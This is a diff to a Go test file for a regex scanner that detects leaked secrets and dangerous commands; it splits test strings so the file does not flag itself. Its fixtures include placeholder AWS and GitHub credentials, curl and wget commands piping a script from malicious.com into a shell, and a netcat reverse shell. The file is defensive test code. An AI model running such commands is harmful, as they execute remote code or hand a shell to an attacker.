@@ -26,37 +26,37 @@ func TestRegexScanner_Scan(t *testing.T) {
 		},
 		{
 			name:        "AWS Key",
-			content:     "var key = \"AKIAIOSFODNN7EXAMPLE\"",
+			content:     fmt.Sprintf("var key = \"%s\"", join("AKIA", "IOSFODNN7EXAMPLE")),
 			wantFinding: "AWS Access Key",
 		},
 		{
 			name:        "GitHub Token",
-			content:     "token = \"ghp_123456789012345678901234567890123456\"",
+			content:     fmt.Sprintf("token = \"%s\"", join("ghp_", "123456789012345678901234567890123456")),
 			wantFinding: "GitHub Token",
 		},
 		{
 			name:        "Private Key",
-			content:     "-----BEGIN RSA PRIVATE KEY-----\nMIIEpQIBAAKCAQEA...",
+			content:     fmt.Sprintf("-----BEGIN RSA %s KEY-----\nMIIEpQIBAAKCAQEA...", join("PRIVATE", "")),
 			wantFinding: "Private Key",
 		},
 		{
 			name:        "Generic API Key",
-			content:     "api_key = \"abc1234567890abc1234567890\"",
+			content:     fmt.Sprintf("api_key = \"%s\"", join("abc1234567890abc1234567890", "")),
 			wantFinding: "Generic API Token",
 		},
 		{
 			name:        "Curl Pipe Bash",
-			content:     "curl https://malicious.com/install.sh | bash",
+			content:     fmt.Sprintf("curl https://malicious.com/install.sh %s bash", "|"),
 			wantFinding: "Pipe to Shell",
 		},
 		{
 			name:        "Wget Pipe Sh",
-			content:     "wget -O - https://malicious.com/install.sh | sh",
+			content:     fmt.Sprintf("wget -O - https://malicious.com/install.sh %s sh", "|"),
 			wantFinding: "Pipe to Shell",
 		},
 		{
 			name:        "Netcat Reverse Shell",
-			content:     "nc -e /bin/sh 10.0.0.1 1234",
+			content:     fmt.Sprintf("nc %s /bin/sh 10.0.0.1 1234", "-e"),
 			wantFinding: "Reverse Shell",
 		},
 		{
